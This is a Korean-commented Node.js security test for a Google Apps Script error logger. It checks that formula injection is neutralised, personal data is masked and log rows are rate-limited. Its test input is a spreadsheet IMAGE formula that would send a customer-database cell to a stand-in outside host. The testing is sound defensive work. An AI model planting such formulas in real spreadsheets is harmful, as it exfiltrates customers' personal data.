// ★★[ERR_LOG_SAFE 2026-10-08 보안 검토] 오류기록에 «밖에서 온 글»이 수식 · 개인정보로 들어가지 않는가를 실제 .gs 로 잰다.
//   오류기록 시트는 고객 DB 와 같은 파일이다. 종전엔 «동작» 칸만 수식 막기를 안 거쳐, 인증 없이
//   `{"action":"=IMAGE(…&다른탭!D2)"}` 한 번으로 고객 DB 파일 안에 바깥 주소를 부르는 수식을 박을 수 있었다.
//   ① 수식 꼴 동작 이름 → «(모름)» 꼴 · 어느 칸도 «=»로 시작하지 않는다
//   ② 고객이 본 글 · 내부 까닭의 전화 · 메일은 가려진다(_maskPII · 진짜 함수)
//   ③ 모르는 동작이 쏟아져도 한 시간에 20줄까지만(진짜 기록을 밀어내지 못하게)
//   ④ 평범한 동작 이름은 그대로 남는다(진단이 흐려지지 않게)
//   ⑤ 관리자 메일에도 가린 글만 간다
//   종료 코드: 0 통과 · 1 재서 틀렸다 · 2 재지 못했다
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const rd = (f) => fs.readFileSync(path.join(ROOT, f), 'utf8');
let rc = 0;
const ok = (m, c, d) => { console.log(`  ${c ? '✅' : '❌'} ${m}${c || d === undefined ? '' : ' → ' + String(d).slice(0, 240)}`); if (!c) rc = 1; };

/* 함수 하나를 소스에서 통째로 꺼낸다(중괄호 짝 맞추기) — 못 찾으면 «재지 못했다» */
function fnSrc(src, name) {
  const i = src.indexOf('function ' + name + '(');
  if (i < 0) return '';
  let d = 0;
  for (let k = src.indexOf('{', i); k < src.length; k++) {
    if (src[k] === '{') d++;
    else if (src[k] === '}') { d--; if (!d) return src.slice(i, k + 1); }
  }
  return '';
}

const NF = process.env.ERR_LOG_SAFE_NF || 'automation/platform/95_notify.gs';   // 돌연변이 확인용으로 다른 판을 넣을 수 있다
let nf, cb;
try { nf = rd(NF); cb = rd('automation/consultation/consultation-booking.gs'); }
catch (e) { console.log('━━ err-log-safe — 파일을 못 읽었습니다 · 재지 못했습니다: ' + e.message); process.exit(2); }
const blk = nf.slice(nf.indexOf("var ERR_LOG_SHEET = '오류기록';"));
const helpers = [fnSrc(cb, '_deFormula'), fnSrc(cb, '_maskPII')];
if (!blk || helpers.some((h) => !h)) { console.log('━━ err-log-safe — _errRecord · _deFormula · _maskPII 를 못 찾았습니다 · 재지 못했습니다'); process.exit(2); }

const rows = [], mails = [];
const cache = new Map();
const g = {
  console, Math, JSON, String, Date, RegExp,
  __ERR_ACT: '', __ERR_TOK: '',
  Utilities: { computeDigest: (a, s) => Array.from(String(s)).map((ch) => ch.charCodeAt(0) % 251), base64EncodeWebSafe: (b) => Buffer.from(b).toString('base64'), formatDate: () => '2026100812', DigestAlgorithm: {}, Charset: {} },
  CacheService: { getScriptCache: () => ({ get: (k) => (cache.has(k) ? cache.get(k) : null), put: (k, v) => { cache.set(k, v); } }) },
  PropertiesService: { getScriptProperties: () => ({ getProperty: () => null, setProperty: () => {} }) },
  SpreadsheetApp: { getActive: () => ({ getSheetByName: () => ({ appendRow: (r) => rows.push(r), getLastRow: () => 3, deleteRows: () => {} }), insertSheet: () => ({}) }) },
  fmtKST: () => '2026-10-08 12:00', _nfAdminLineEmail: (t) => mails.push(String(t)), findCustomerByToken: () => null, _findCustomerBy: () => null
};
try { vm.createContext(g); vm.runInContext(helpers.join('\n') + '\n' + blk, g); }
catch (e) { console.log('━━ err-log-safe — GAS 코드를 못 올렸습니다 · 재지 못했습니다: ' + e.message); process.exit(2); }
if (typeof g._errRecord !== 'function') { console.log('━━ err-log-safe — _errRecord 가 없습니다 · 재지 못했습니다'); process.exit(2); }

const isFormula = (v) => typeof v === 'string' && /^[=\t\r]/.test(v);
console.log('━━ err-log-safe · 오류기록에 수식 · 개인정보가 들어가지 않는가 [ERR_LOG_SAFE]');

/* ① 수식 꼴 동작 이름(인증 없이 doPost 로 보낼 수 있는 꼴) */
const evil = '=IMAGE("https://x.example/?"&Customers!D2)';
g._errRecord(evil, 'X3', '지금은 처리할 수 없어요 (코드 X3)', '알 수 없는 동작 ' + evil.slice(0, 40) + ' · GAS 새 배포 확인', '', '');
const r1 = rows[rows.length - 1] || [];
ok('① 수식 꼴 동작 이름이 수식으로 들어가지 않는다(«(모름)» 꼴)', rows.length === 1 && !isFormula(r1[3]) && /^\(모름\) /.test(String(r1[3])), JSON.stringify(r1));
ok('① 그 줄의 어느 칸도 «=»로 시작하지 않는다', r1.every((v) => !isFormula(v)), JSON.stringify(r1));

/* ② 전화 · 메일 가림 */
rows.length = 0;
g._errRecord('saveProductionTrack', 'S9', '010-1234-5678 로 연락 주세요 · me@example.com', 'TypeError at x · 연락처 01012345678', 'K7QA', '');
const r2 = rows[0] || [];
ok('② 고객이 본 글의 전화 · 메일이 가려진다', !/010-1234-5678|me@example\.com/.test(String(r2[5])), JSON.stringify(r2));
ok('② 내부 까닭의 전화가 가려진다', !/01012345678/.test(String(r2[6])), JSON.stringify(r2));
ok('④ 평범한 동작 이름은 그대로 남는다', r2[3] === 'saveProductionTrack', JSON.stringify(r2));
ok('⑤ 관리자 메일(9)에도 가린 글만 간다', mails.length > 0 && mails.every((t) => !/010-1234-5678|me@example\.com|01012345678/.test(t)), JSON.stringify(mails));

/* ③ 모르는 동작이 쏟아질 때 */
rows.length = 0;
for (let i = 0; i < 40; i++) g._errRecord('=X' + i + '()', 'X3', '지금은 처리할 수 없어요 (코드 X3)', '알 수 없는 동작 =X' + i + '() · GAS 새 배포 확인', '', '');
ok('③ 모르는 동작 40번 → 한 시간에 20줄 이하(진짜 기록을 밀어내지 못한다)', rows.length <= 20 - 1, rows.length + '줄');
ok('③ 그 줄들도 «=»로 시작하는 칸이 없다', rows.every((r) => r.every((v) => !isFormula(v))), JSON.stringify(rows[0]));

console.log(rc ? '━━ 빨강 — 오류기록에 밖의 글이 수식 · 개인정보로 들어간다' : '━━ 초록');
process.exit(rc);
